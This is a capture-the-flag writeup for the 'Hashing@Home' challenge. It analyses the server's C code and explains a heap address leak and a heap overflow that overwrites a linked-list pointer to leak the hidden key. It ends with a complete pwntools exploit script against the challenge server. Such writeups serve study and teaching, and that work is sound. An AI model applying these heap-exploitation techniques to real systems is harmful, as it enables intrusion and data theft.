---
layout: "post"
title: "SpamAndHex 2020 Hashing@Home Writeup"
date: 2020-5-12
exerpt: "Heap Overflow ,Arbitrary Read and Partial Abritrary Write on Heap"
tags: [Heap, Overflow]
---


We had a lot of fun solving this challenge and were so close to solving the challege but we couldnt get the pun that the description was trying to make. Anyways , jokes apart , following is the intended solution for this challenege.

## Description

We have been provided with the source code running on the **server** side as well as the client side.


## Source Code Analysis

Initially , let's compile the source with `gcc -o server server.c`.

The source code of the server binary is pretty straight forward.

The main function reads 3 arguments.

```c
int main(int argc, char** argv){
    if (argc != 4) {
        printf(
            "Usage: hashing_at_home_server key_bytes records_file output_file\n"
            "\n"
            "This software reads a file in chunks, hashes these chunks many times\n"
            "and then combine the hashes and hash them again for extra secureness.\n"
            "Unfortunately, this is resource-intensive, so it uses a networked worker\n"
            "to do the hash rounds in parallel.\n"
            "\n"
            "(TEST VERSION USING STDIO. use xinetd or something to make it networked)\n");
        return 1;
    }
    key_bytes = calloc(1, 64);
    strncpy(key_bytes, argv[1], 63);
    read_input(argv[2]);
    do_the_work();
    write_output(argv[3]);
    return 0;
}
```

* The first Argument is the string that is stored on the heap with a *calloc* call of 64 bytes.
* The Second Argument is a **char pointer** to the *read_input* function.
* The Third Argument is also a *char pointer* to the *write_output* function.

There are constants defined.

```c
#define ROUNDS 100
#define CHUNK_SIZE 32
#define CONTEXT_MAGIC 0x6861736822686f6dULL

```

The *read_input* function creates a structure for each allocated chunk.

```c
void read_input(char* filename){
    int fd = open(filename, O_RDONLY);
    char record[CHUNK_SIZE];
    hash_rpc_context * previous=NULL;
    while(read(fd,record,CHUNK_SIZE)==CHUNK_SIZE){
        hash_rpc_context *context = calloc(1, sizeof(hash_rpc_context));
        context->magic = CONTEXT_MAGIC;
        context->next = previous;
        context->rounds_left = ROUNDS;
        for (unsigned i=0; i<CHUNK_SIZE; ++i)
            context->data_to_hash[i] = record[i] ^ key_bytes[i];
        previous = context;
    }
    first_context = previous;
    close(fd);
}
```

Subsequently , the *read_input* opens the file with name that was passed as second argument to the binary and then callocs chunks of size 32 bytes until the entire data from the file is read and then xors the content of file with the initial argument that was passed into the binary which obviously is hidden from our site.

```c
void do_the_work(){
    for (hash_rpc_context* context = first_context; context; context = context->next){
        send_request(context);
    }
    while(first_context->next) {
        receive_response();
    }
}
```

This function iterates over all chunks and calls the function *send_request*.

```c
void send_request(const hash_rpc_context* request_context){
    /* XXX: the request's pointer is used as the request ID
     * maybe this should be an UUID? */
    write(1, &request_context, sizeof(request_context));
    write(1, request_context->data_to_hash, CHUNK_SIZE);
}
```

This function writes the content of all the user input chunks one by one by iterating through the linked list of all heap chunks except the very first one.

The first write prints **heap address** and hence we have Heap Leak with no efforts :P.

Thereafter , in the while loop of *do_the_work* function which executes till *first_context->next* is **NULL** and calls the function *recieve_response*.

## The Idea of Exploitation

```c

void receive_response(){
    hash_rpc_context* request_context;
    char response_data[CHUNK_SIZE];
    if (read(0, &request_context, sizeof(request_context)) != sizeof(request_context)){
        exit(2);
    }
    if (read(0, response_data, CHUNK_SIZE) != CHUNK_SIZE) {
        exit(3);
    }
    if (request_context->magic != CONTEXT_MAGIC) {
        exit(4);
    }
    process_response(request_context, response_data);
}

```

Here , we have arbitrary write , but how??
We have two reads being called *read(0, &request_context, sizeof(request_context))* and *read(0, response_data, CHUNK_SIZE)* both of which take user input from **STDIN** and then check whether the `*(request_context+8)==CONTEXT_MAGIC` and then calls the function *process_response*.

Initially we would not trigger the *process_response* function if we give some random input but dont't forget we have heap leaks all of which come from the structure that we saw earlier and hence passing a heap address we leaked could get us ahead into the *process_request* function.


Now comes the interesting part.

```c
void process_response(hash_rpc_context* request_context, char response_data[CHUNK_SIZE]){
    --request_context->rounds_left;
    if(request_context->rounds_left){
        memcpy(request_context->data_to_hash, response_data, CHUNK_SIZE);
        send_request(request_context);
    } else {
        if (
            first_context->next &&
            first_context->rounds_left == 0 &&
            first_context->next->rounds_left == 0
        ){
            hash_together_the_first_two();
        }
    }
}
```

Awesome!! We have a memcpy here which copies *response_data* [We control] to *request_context->data_to_hash* [Also in our control].
e
Hence , now we have almost arbitrary write on heap and stack also [But we dont have stack leak].
Ok , so the first idea that popped into my mind was , we could write on heap and fake its structure.
What if we write the *CONTEXT_MAGIC*  somewhere else on the heap , then we could take a pointer 8 bytes off the place we wrote *CONTEXT_MAGIC* to and easily trigger **heap overflow**.

By triggering the heap overflow , we can overwrite the structure of the next chunk. 
But what advantage does this give us??
* We dont have Free call anywhere.
* We dont have any unlink anywhere.
* All we have is we can read data from almost anywhere on heap.

In response to all the information we had at the moment , I began searching for libc pointers on heap [if any] but found nothing to my disappointment :(.

This is where we were stuck during the CTF thinking of various possibilities of leaking libc and overwriting stack return address as we could trigger stack overflow also ,given we had a stack leak.

One interesting thing is that , we could craft the location of *CONTEXT_MAGIC* in such a way that , if we had a stack leak , we could easily bypass canary and get to the saved EIP.

Thereafter , we were totally puzzled as to how we should move forward with exploitation.
The server side binary had **jemalloc** implemenated. This caught our attention.
Considering this possibility that the further exploitation could be related to jemalloc, we started reading through internals of jemalloc without any luck.

## The final Exploit

If we observe the *process_response* function there's an if condition which on returning true , calls a mysterious function , *hash_together_the_first_two*.

As we have heap overflow , we can satisfy the constraints of the if conditions and call that function.

```c
void hash_together_the_first_two(){
    for (unsigned i=0; i<CHUNK_SIZE; ++i){
        first_context->next->data_to_hash[i] ^= first_context->data_to_hash[i];
    }
    /* TODO: free the first context. It crashes for some reason sometimes though */
    first_context = first_context->next;
    first_context->rounds_left = ROUNDS;
    send_request(first_context);
}

```
This function xors the data of `current_chunk` with the data of the `current_chunk->next`.
Then , it updates the `first_context` to `first_context->next`.
Note that `first_context` is the chunk most recently allocated and we could overwrite its `fd` by overflowing from the chunk just above it.

If we overwrite the fd of the `first_context` chunk with the heap address of `key_bytes`[the very first allocated chunk on heap] , we can view it's contents.

On server , the contents of only the first argument are hidden so we try to leak them also.
And eventually , it turns out that , the `key_bytes` were nothing but the flag.

Here is the complete exploit.

```py
#!/usr/bin/env python3
from pwn import *
 
r = remote('35.230.128.35', 1337)
magic = 0x6861736822686f6d
 
def read():
    ptr = u64(r.recvn(8))
    data = r.recvn(32)
    print(f'{ptr:x}: {data}')
    return ptr
 
def send(ptr, d0, d1, d2, d3):
    r.send(p64(ptr))
    r.send(p64(d0) + p64(d1) + p64(d2) + p64(d3))
 
reqs = [read() for _ in range(16)]
#Print contents of entire heap eventually printing flag also
send(reqs[0], 0, 0, 0, 0)
read()
send(reqs[1], 0, 0, 0, magic)
read()
send(reqs[0] - 16, 1, reqs[15] - 64 - 3*8, 0, 0)
read()
send(reqs[0], 0, 0, 0, 0)
read()
```









